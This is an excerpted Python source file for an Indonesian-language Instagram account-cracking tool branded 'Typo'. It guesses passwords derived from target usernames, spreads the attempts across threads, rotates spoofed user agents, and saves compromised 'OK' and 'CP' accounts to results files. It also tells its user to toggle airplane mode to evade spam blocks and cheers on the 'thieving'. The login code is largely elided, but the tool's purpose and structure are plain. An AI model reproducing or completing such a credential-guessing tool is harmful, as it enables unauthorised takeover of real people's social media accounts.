...
reset = "[/]"
uadia, uadarimu, prox = [], [], []
sys.stdout.write('\x1b]2; Typo\x07')
...
class Instagram:
    ...
    for xc in range(10000):
        ...
        UserAgents5 = f"Mozilla/5.0 (Linux; Android 10; Infinix X657 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/355.0.0.6.103;]"
        UserAgents6 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 QQ/8.5.0.635 V1_IPH_SQ_8.5.0_1_APP_A Pixel/1170 MiniAppEnable SimpleUISwitch/0 QQTheme/1000 Core/WKWebView Device/Apple(iPhone 12 Pro) NetType/WIFI QBWebViewType/1 WKType/1"
...
""",title=f"{P2}{H2}{self.timeLine()}",width=80,padding=(0,4),style=f"{color_table}"))
  ...
  #      self.loadCookie(Instagram)
    ...
    def gett(self):
        try:
            iyh.update(self.ses.get("https://pastebin.com/raw/WnPSTxBJ").json())
        except requests.ConnectionError:
            self.logoo()
            print(f" {H}•{N} {M}Koneksi Internet Anda Bermasalah")
            time.sleep(3);exit()
    ...
    def cook(self, tok, cok):
        try:
            ...
            self.logoo()
            print(f" {H}•{N} {M}Internet Lu Kaya Kon🪵")
            time.sleep(3);exit()
    ...
    def menu(self):
     ...
     #   os.popen('data/play-audio/menu.mp3')
        ...
        prints(Panel(f"""\t{P2}Ketik {color_rich}Menu2{P2} Untuk Ke Menu2/9 Typo""",width=80,padding=(0,7),style=f"{color_table}"))
 ...
 #           self.bots()        
    ...
    def lains(self):
        prints(Panel(f"{U2}[{color_rich}08{U2}]. Check Akun Hasil Crack     {U2}[{color_rich}03{U2}]. Settting UserAgent\n{U2}[{color_rich}02{U2}]. Gabung Group WhatsApp Typo      {U2}[{color_rich}04{U2}]. Ambil UserAgent",width=80,padding=(0,7),style=f"{color_table}"))
        prints(Panel(f"{U2}[{color_rich}05{U2}]. Lihat Jumlah Pengguna Script Typo\n{U2}[{color_rich}06{2}]. Ganti Warna Tema Tools Typo",width=80,padding=(0,13),style=f"{color_table}"))
        ...
        if ask in ["",""]:
           ...
           time.sleep(2);self.menu()
            ...
            prints(Panel(f"{P2}Jumlah Pengguna Script Typo {color_rich}{self.Typo}{P2} Orang",width=80,padding=(0,15),style=f"{color_table}"))
            time.sleep(3)
            print(f" {H}•{N} Kamu Adalah Pengguna Ke {H}{self.Typo} {N}Terimakasih:)")
...
{N}[{H}+{N}] {H}OK(SELAMAT){N}
 ...
 {N}├╴>{N} following : {H}{ful}{N}
    ...
    def metode(self):
        urut = []
        urut.append(Panel(f"{U2}Methode {H2}Oke👍{P2}",title=f"{H2}0A{P2}",width=25,padding=(0,4),style=f"{color_table}"))
        urut.append(Panel(f"{U2}Methode {K2} Mungkin🙂 {P2}",title=f"{H2}0B{P2}",width=25,padding=(0,4),style=f"{color_table}"))
        urut.append(Panel(f"{U2}Methode {M2}Eeemmmm🤷",title=f"{H2}0C{P2}",width=27,padding=(0,6),style=f"{color_table}"))
        console.print(Columns(urut))
    ...
    def mulai(self):
        ...
        self.tampung()
        prints(Panel(f"{P2}Hidupkan Mode Pesawat Ketika Kena {color_rich}Spam. Semangat Malingnya{P2}",width=80,padding=(0,4),style=f"{color_table}"))
                ...
                for user in self.id:
                    ...
                    for pasw in nama.split(" "):
                        ...
                        if 'satu' in method:
                           ...
                           bool.submit(self.Ngocok, usez, sandi)
            print("\r")
            prints(Panel(f" {P2}Typo {color_rich}{len(self.id)} {P2}Username Selesai Hasil OK : {H2}{len(self.ok)}{P2} Hasil CP : {K2}{len(self.cp)}{P2} ",width=80,padding=(0,8),style=f"{color_table}"))
            time.sleep(3);exit()
                    ...
                    with requests.Session() as ses:
                         ...
                         if "logged_in_user" in str(xnxx.text) or "sessionid" in ses.cookies.get_dict() or "userId" in str(xnxx.text):
                           ...
                           #   os.popen('play-audio rayok.mp3')
                              prints(Panel(pepekXD,style='',title=f'\r{H2}Typo OK'))
                         ...
                         #     os.popen('play-audio raycp.mp3')
                              prints(Panel(pepekXD,style='',title=f'\r{K2}Typo CP'))
                              self.ok.append(kntl)
                              with open("results/"+akunOK,"a", encoding="utf-8") as r:
                                   r.write(kntl+"\n")
                              break
                              ...
                              prog.update(des,description=f"[{M2} Typo {P2}] ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                              time.sleep(15)
    ...
    def crackXC(self, user, pasw):
        prog.update(des,description=f"[{H2} Typo {P2}] ( {H2}stabil{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
        prog.advance(des)
        for password in pasw:
              try:
                    with requests.Session() as ses:
    ...
    def Ngocok(self, user, pasw):
        ...
        prog.update(des,description=f"Typo ( {H2}stabil{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
        prog.advance(des)
        for password in pasw:
            try:
             ...
             #       os.popen('play-audio raycp.mp3')
                    ...
                    prog.update(des,description=f"Typo ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                    time.sleep(15)
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f"Typo ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                prog.advance(des)
